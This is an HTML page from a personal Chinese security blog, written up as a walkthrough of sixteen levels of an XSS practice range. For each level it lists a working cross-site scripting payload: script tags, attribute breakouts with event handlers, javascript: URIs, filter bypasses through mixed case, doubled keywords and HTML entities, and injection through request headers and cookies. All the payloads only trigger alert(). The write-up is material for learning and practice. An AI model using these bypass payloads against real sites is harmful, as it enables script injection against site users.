@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言http:&#x2F;&#x2F;test.ctf8.com&#x2F;  level 1name变量通过GET方式传入，直接带入到标签中，没有任何过滤。 payload 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  level 2将第一关的payload带进去，发现输入值被原封不动的输出了。查看页面源代码  发现输入的&lt;、&gt;被html编码了。 payload 1&amp;q">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS靶场练习二">
+<meta property="og:url" content="http://140.143.122.13/posts/6855.html">
+<meta property="og:site_name" content="忆时光">
+<meta property="og:description" content="前言http:&#x2F;&#x2F;test.ctf8.com&#x2F;  level 1name变量通过GET方式传入，直接带入到标签中，没有任何过滤。 payload 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  level 2将第一关的payload带进去，发现输入值被原封不动的输出了。查看页面源代码  发现输入的&lt;、&gt;被html编码了。 payload 1&amp;q">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://140.143.122.13/posts/6855/1.png">
+<meta property="og:image" content="http://140.143.122.13/posts/6855/2.png">
+<meta property="og:image" content="http://140.143.122.13/posts/6855/3.png">
+<meta property="og:image" content="http://140.143.122.13/posts/6855/4.png">
+<meta property="article:published_time" content="2020-05-04T09:39:19.000Z">
+<meta property="article:modified_time" content="2020-05-04T13:08:57.300Z">
+<meta property="article:author" content="ca5tle">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://140.143.122.13/posts/6855/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>XSS靶场练习二</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/36799.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/32710.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://140.143.122.13/posts/6855.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://140.143.122.13/posts/6855.html&text=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://140.143.122.13/posts/6855.html&is_video=false&description=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS靶场练习二&body=Check out this article: http://140.143.122.13/posts/6855.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://140.143.122.13/posts/6855.html&name=XSS靶场练习二&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://140.143.122.13/posts/6855.html&t=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">2.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-number">3.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-number">4.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-number">5.</span> <span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-number">6.</span> <span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">7.</span> <span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">8.</span> <span class="toc-text">level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">9.</span> <span class="toc-text">level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-9"><span class="toc-number">10.</span> <span class="toc-text">level 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-10"><span class="toc-number">11.</span> <span class="toc-text">level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-11"><span class="toc-number">12.</span> <span class="toc-text">level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-12"><span class="toc-number">13.</span> <span class="toc-text">level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-13"><span class="toc-number">14.</span> <span class="toc-text">level 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-14"><span class="toc-number">15.</span> <span class="toc-text">level 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-15"><span class="toc-number">16.</span> <span class="toc-text">level 15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-16"><span class="toc-number">17.</span> <span class="toc-text">level 16</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XSS靶场练习二
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ca5tle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-04T09:39:19.000Z" itemprop="datePublished">2020-05-04</time>
+        
+        (Updated: <time datetime="2020-05-04T13:08:57.300Z" itemprop="dateModified">2020-05-04</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WEB/">WEB</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://test.ctf8.com/" target="_blank" rel="noopener">http://test.ctf8.com/</a></p>
+<p><img src="/posts/6855/1.png" alt></p>
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>name变量通过<code>GET</code>方式传入，直接带入到标签中，没有任何过滤。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>将第一关的payload带进去，发现输入值被原封不动的输出了。查看页面源代码</p>
+<p><img src="/posts/6855/2.png" alt></p>
+<p>发现输入的<code>&lt;、&gt;</code>被<code>html</code>编码了。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>输入点(INPUT_POINT)有两处，一处在标签间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;&quot;center&quot;&gt;没有找到和INPUT_POINT相关的结果.&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure>
+
+<p>另一处在标签属性处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;keyword&quot; value&#x3D;&quot;INPUT_POINT&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对左右尖括号<code>&lt;,&gt;</code>被转化成<code>HTML</code>字符实体(HTML Entity)的情况，想直接构造标签是有难度的(宽字符构造尖括号?)所以从另一处入手。<br>输入点位于属性内，所以闭合属性并构造新属性，基于事件弹窗。<br>(然而如果输入点对&lt;,&gt;,’,”都进行了字符实体转换呢)<br>(构造标签的关键是&lt;,&gt;, 闭合属性的关键是引号)</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和 level 3 输出点一致</p>
+<p>只是level 3中<code>value=&#39;&#39;</code>，而level 4中的<code>value=&quot;&quot;</code>，所以要闭合<code>value</code>上面要用<code>&#39;</code>，此处要用<code>&quot;</code></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="/posts/6855/3.png" alt></p>
+<p><code>on</code> 替换为 <code>o_n</code>，<code>script</code> 替换为 <code>sc_ript</code><br>因此不能再考虑用事件触发，也不能用<code>script</code>标签触发。</p>
+<p><strong>payload</strong></p>
+<p>此处的用<code>&quot;&gt;</code>截断属性，再用a标签触发<br>关键在于虽然在h5的内容过滤了，但在属性内未过滤<code>&quot;&gt;</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:%61lert(1)&quot;&gt;click me&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(&#x2F;1&#x2F;)&quot;&gt;axxx&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>在上一关限制的基础上，将所有的属性，如<code>src</code>、<code>href</code>等等都进行转换。</p>
+<p>此处可用大小写混合绕过。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(&#x2F;1&#x2F;)&quot;&gt;axxx&lt;&#x2F;a&gt;</span><br><span class="line">&quot;&gt; &lt;Script&gt;alert(&#39;handsome boy&#39;)&lt;&#x2F;script&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;img Src&#x3D;x OnError&#x3D;alert(&#39;xss&#39;)&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><code>href</code>, <code>on</code>, <code>script</code>等关键字被删除了。</p>
+<p>此处可用双写关键字绕过</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonninput&#x3D;alert(1) &quot;</span><br><span class="line">&quot;&gt; &lt;scscriptript&gt;alert&#96;xss&#96;&lt;&#x2F;scscriptript&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>属性中双引号被转换成<code>HTML</code>实体，无法截断属性。<br>由于<code>script</code>关键字被过滤，得考虑绕过方式，使用<code>HTML</code>实体字符绕过<br><code>HTML16</code>编码<br><code>HTML10</code>编码</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&#x2F;1&#x2F;)</span><br><span class="line">javascript:%61lert(1)</span><br><span class="line">javasc&amp;#x72;ipt:alert&#96;1&#96;</span><br><span class="line">javasc&amp;#x0072;ipt:alert&#96;1&#96;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>提交参数中必须要有http关键字</p>
+<p><strong>payload</strong></p>
+<p><strong>记得替换<code>script</code>，比如用<code>&amp;#x72;</code>替换r</strong><br><code>%0d</code>和<code>%0a</code>,<code>/</code>等有时具有替代空格的作用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;www.0aa.me  &#x2F;&#x2F;利用注释</span><br><span class="line">javascript:%0dhttp:&#x2F;&#x2F;www.0aa.me%0dalert(1)  &#x2F;&#x2F;不能用注释的情况下</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>可以看出这里<code>keyword</code>变量依然没戏，被<code>HTML</code>实体化输出了出来，所以重点放在<code>t_sort</code>变量上，只过滤了尖括号，然后就直接输出到了标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的标签使用了<code>type=&quot;hidden&quot;</code>将输入框隐藏了起来，可以手动赋值<code>type</code>的值来覆盖掉先前的属性来达到显示文本框的目的。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword&#x3D;233&amp;t_sort&#x3D;&quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>与 level 10 类似，寻找新的注入点。<br>原来的<code>t_sort</code>的双引号被过滤了。<br>这次注入点是在 <code>HTTP Request Header</code> 请求头的 <code>Refer</code> 字段。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;text&quot; onmouseover&#x3D;alert&#96;1&#96; &quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>这一题和上一题类似，只是这里的漏洞点出现在了<code>HTTP</code>请求头的<code>User-Agent</code>。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>寻找新的注入点，这次是利用<code>cookie</code>中的参数注入。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user&#x3D;&quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>看了先知的wp，才知道是图片exif 藏有xss payload。<a href="https://xianzhi.aliyun.com/forum/read/1462.html?page=2" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/read/1462.html?page=2</a></p>
+<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html" target="_blank" rel="noopener">AngularJS ng-include 指令</a></p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
+<p>发现可以包含第一关的页面</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src&#x3D;‘level1.php?name&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;‘</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p>
+<p>可以使用如下符号替代空格</p>
+<p><img src="/posts/6855/4.png" alt></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword&#x3D;&lt;img%0asrc&#x3D;x%0aonerror&#x3D;alert(&#39;XSS&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
+            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">2.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-number">3.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-number">4.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-number">5.</span> <span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-number">6.</span> <span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">7.</span> <span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">8.</span> <span class="toc-text">level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">9.</span> <span class="toc-text">level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-9"><span class="toc-number">10.</span> <span class="toc-text">level 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-10"><span class="toc-number">11.</span> <span class="toc-text">level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-11"><span class="toc-number">12.</span> <span class="toc-text">level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-12"><span class="toc-number">13.</span> <span class="toc-text">level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-13"><span class="toc-number">14.</span> <span class="toc-text">level 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-14"><span class="toc-number">15.</span> <span class="toc-text">level 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-15"><span class="toc-number">16.</span> <span class="toc-text">level 15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-16"><span class="toc-number">17.</span> <span class="toc-text">level 16</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://140.143.122.13/posts/6855.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://140.143.122.13/posts/6855.html&text=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://140.143.122.13/posts/6855.html&is_video=false&description=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS靶场练习二&body=Check out this article: http://140.143.122.13/posts/6855.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://140.143.122.13/posts/6855.html&title=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://140.143.122.13/posts/6855.html&name=XSS靶场练习二&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://140.143.122.13/posts/6855.html&t=XSS靶场练习二" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2020
+    ca5tle
+	<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+	<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">你自己的备案号</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
